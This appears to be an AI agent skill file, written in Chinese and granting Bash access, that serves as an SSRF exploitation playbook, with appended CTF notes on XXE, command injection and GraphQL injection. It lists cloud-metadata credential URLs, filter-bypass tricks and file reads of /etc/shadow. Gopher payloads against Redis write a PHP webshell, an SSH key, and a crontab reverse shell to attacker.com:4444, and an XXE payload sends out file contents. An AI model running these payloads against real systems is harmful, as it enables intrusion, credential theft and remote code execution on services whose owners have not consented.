---
name: ssrf
description: 服务端请求伪造漏洞检测与利用。当目标存在 URL 参数、远程文件加载、Webhook、PDF 生成、URL 预览功能时使用。
allowed-tools: Bash, Read, Write
---

# 服务端请求伪造 (SSRF)

利用服务器发起请求，访问内网资源、读取本地文件或攻击其他服务。

## 常见指示器

- URL 参数（url=, link=, src=, target=, fetch=, uri=）
- 图片/文件远程加载功能
- Webhook 配置
- PDF 生成（从 URL 获取内容）
- URL 预览/缩略图功能
- 导入/导出功能（从 URL）
- 头像 URL 设置

## 检测方法

### 1. 基础测试

```bash
# 外部服务器确认
curl "http://target.com/fetch?url=http://your-server.com"

# 本地回环
curl "http://target.com/fetch?url=http://127.0.0.1"
curl "http://target.com/fetch?url=http://localhost"

# 内网探测
curl "http://target.com/fetch?url=http://192.168.1.1"
```

### 2. 协议测试

```bash
# file 协议
curl "http://target.com/fetch?url=file:///etc/passwd"

# gopher 协议
curl "http://target.com/fetch?url=gopher://127.0.0.1:6379/_info"

# dict 协议
curl "http://target.com/fetch?url=dict://127.0.0.1:6379/info"
```

## 攻击向量

### 基础 SSRF

```bash
# 本地回环
http://127.0.0.1/
http://localhost/
http://127.0.0.1:22/
http://127.0.0.1:3306/
http://127.0.0.1:6379/
http://127.0.0.1:27017/
http://127.0.0.1:9200/
http://127.0.0.1:11211/

# 内网探测
http://192.168.1.1/
http://192.168.0.1/
http://10.0.0.1/
http://172.16.0.1/

# 端口扫描
http://127.0.0.1:21/
http://127.0.0.1:22/
http://127.0.0.1:23/
http://127.0.0.1:25/
http://127.0.0.1:80/
http://127.0.0.1:443/
http://127.0.0.1:3389/
http://127.0.0.1:8080/
```

### 云元数据服务

```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

# DigitalOcean
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/id

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```

### 协议利用

```bash
# file 协议 - 读取本地文件
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///proc/self/environ
file:///proc/self/cmdline
file:///c:/windows/win.ini

# gopher 协议 - 攻击内网服务
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
gopher://127.0.0.1:3306/_
gopher://127.0.0.1:9000/_

# dict 协议 - 探测服务
dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats

# ftp 协议
ftp://127.0.0.1/
ftp://anonymous:anonymous@127.0.0.1/

# sftp 协议
sftp://attacker.com/
```

### 攻击 Redis

```bash
# 使用 gopher 协议攻击 Redis
# 1. 写入 webshell
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<%3fphp%20system($_GET['cmd'])%3b%3f>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# 2. 写入 SSH 公钥
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$[LENGTH]%0d%0a%0a%0assh-rsa AAAA...%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# 3. 写入 crontab
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

### 攻击 FastCGI

```bash
# 使用 Gopherus 生成 payload
python gopherus.py --exploit fastcgi

# 生成的 gopher payload 可以执行任意 PHP 代码
gopher://127.0.0.1:9000/_...
```

## 绕过技术

### IP 地址变形

```bash
# 十进制
http://2130706433/  # 127.0.0.1
http://3232235521/  # 192.168.0.1

# 十六进制
http://0x7f000001/  # 127.0.0.1
http://0x7f.0x0.0x0.0x1/

# 八进制
http://0177.0.0.01/  # 127.0.0.1
http://017700000001/

# 混合
http://127.1/
http://127.0.1/
http://0/
http://0.0.0.0/
```

### IPv6 绕过

```bash
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
```

### DNS 绕过

```bash
# 使用解析到内网的域名
http://127.0.0.1.nip.io/
http://127.0.0.1.xip.io/
http://localtest.me/  # 解析到 127.0.0.1
http://spoofed.burpcollaborator.net/

# DNS rebinding
# 1. 设置 DNS 记录 TTL=0
# 2. 第一次解析返回外部 IP（通过检查）
# 3. 第二次解析返回内部 IP（实际请求）
```

### URL 解析差异

```bash
# @ 符号
http://attacker.com@127.0.0.1/
http://127.0.0.1:80@attacker.com/

# # 符号
http://attacker.com#@127.0.0.1/
http://127.0.0.1#attacker.com/

# ? 符号
http://attacker.com?@127.0.0.1/

# 反斜杠
http://attacker.com\@127.0.0.1/
```

### 协议绕过

```bash
# 大小写
FILE:///etc/passwd
Gopher://127.0.0.1:6379/
DICT://127.0.0.1:6379/

# 编码
file%3a%2f%2f%2fetc%2fpasswd
gopher%3a%2f%2f127.0.0.1%3a6379%2f
```

### 重定向绕过

```bash
# 1. 在自己服务器设置 302 重定向
# Location: http://127.0.0.1/

# 2. 请求自己的服务器
http://attacker.com/redirect.php

# redirect.php:
<?php header("Location: http://127.0.0.1/"); ?>
```

### 短链接绕过

```bash
# 使用短链接服务
# 创建指向 http://127.0.0.1 的短链接
http://bit.ly/xxxxx
http://tinyurl.com/xxxxx
```

## 工具使用

### SSRFmap

```bash
# 基础扫描
python ssrfmap.py -r request.txt -p url -m portscan

# 读取文件
python ssrfmap.py -r request.txt -p url -m readfiles

# 攻击 Redis
python ssrfmap.py -r request.txt -p url -m redis
```

### Gopherus

```bash
# 生成 Redis payload
python gopherus.py --exploit redis

# 生成 FastCGI payload
python gopherus.py --exploit fastcgi

# 生成 MySQL payload
python gopherus.py --exploit mysql
```

## 最佳实践

1. 先用外部服务器确认 SSRF 存在
2. 尝试访问本地回环和内网地址
3. 测试云元数据服务（169.254.169.254）
4. 尝试不同协议（file, gopher, dict）
5. 使用绕过技术规避过滤
6. 探测内网服务端口
7. 利用 gopher 攻击内网服务（Redis, FastCGI）
8. 注意响应差异（时间、内容、状态码）

---

## 来自外部导入内容 (CTF Web - server-side.md SSRF 部分)

### Host Header SSRF (MireaCTF)

服务器端代码使用 HTTP `Host` 头构建内部验证请求:
```go
response, err := http.Get("http://" + c.Request.Host + "/validate")
```

**利用:**
1. 设置攻击者控制的服务器返回所需响应:
```python
from flask import Flask
app = Flask(__name__)
@app.route("/validate")
def validate():
    return '{"access": true}'
app.run(host='0.0.0.0', port=5000)
```
2. 发送带有伪造 Host 头的请求:
```bash
curl -H "Host: attacker.ngrok-free.app" https://target/api/secret-object
```

### DNS 重绑定 TOCTOU

```python
rebind_url = "http://7f000001.external_ip.rbndr.us:5001/flag"
requests.post(f"{TARGET}/register", json={"url": rebind_url})
requests.post(f"{TARGET}/trigger", json={"webhook_id": webhook_id})
```

### Curl 重定向链绕过

在 `CURLOPT_MAXREDIRS` 超出后，某些实现进行一次未验证的请求:
```c
case CURLE_TOO_MANY_REDIRECTS:
    curl_easy_getinfo(curl, CURLINFO_REDIRECT_URL, &redirect_url);
    curl_easy_setopt(curl, CURLOPT_URL, redirect_url);  // 无验证
    curl_easy_perform(curl);
```

### XXE (XML External Entity)

**基本 XXE:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

**OOB XXE 配合外部 DTD:**
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://YOUR-SERVER/flag?b64=%file;'>">
%eval; %exfil;
```

**XXE 通过 DOCX/Office XML 上传 (School CTF 2016):**

```bash
# 创建带有 XXE 的 DOCX
mkdir docx_exploit && cd docx_exploit
unzip template.docx
cat > '[Content_Types].xml' << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <Override PartName="/hack" ContentType="&xxe;"/>
</Types>
EOF
zip -r exploit.docx '[Content_Types].xml' word/ _rels/
curl -F "file=@exploit.docx" http://target/upload
```

### XML 注入通过 X-Forwarded-For 头 (Pwn2Win 2016)

```http
X-Forwarded-For: 1.2.3.4</ip><admin>true</admin><ip>4.3.2.1
```

### 命令注入

**绕过技术:**
```bash
# 新行绕过
curl -X POST http://target/ -d "ip=127.0.0.1%0acat%20flag.txt"

# 不完整黑名单绕过
# 当 cat/head/less 被阻止: sed -n p flag.txt, awk '{print}', tac flag.txt
```

**Sendmail 参数注入通过 CGI (SECCON 2015):**
```perl
open(SH, "|/usr/sbin/sendmail -bm '$user_input'");
# 利用: mail=' -bp|ls SECRETS #
```

**Git CLI 新行注入通过 URL 路径 (BSidesSF 2026):**
```text
GET /file/test%22%0acat%20/home/ctf/flag.txt%0aecho%20%22 HTTP/1.1
```

### GraphQL 注入 (Hack.lu CTF 2020, HeroCTF v5)

** introspection 查询:**
```graphql
{__schema{types{name,fields{name,args{name,type{name}}}}}}
```

**查询批处理和别名绕过速率限制:**
```graphql
mutation {
  a1: increaseVote(id: "target") { count }
  a2: increaseVote(id: "target") { count }
  a3: increaseVote(id: "target") { count }
}
```

**字符串插值注入:**
```javascript
// 漏洞服务器代码模式:
const query = `mutation { doAction(input: "${userInput}") { result } }`;
// 注入 payload:
") { result } } mutation { adminAction(secret: true) { flag } } #
```
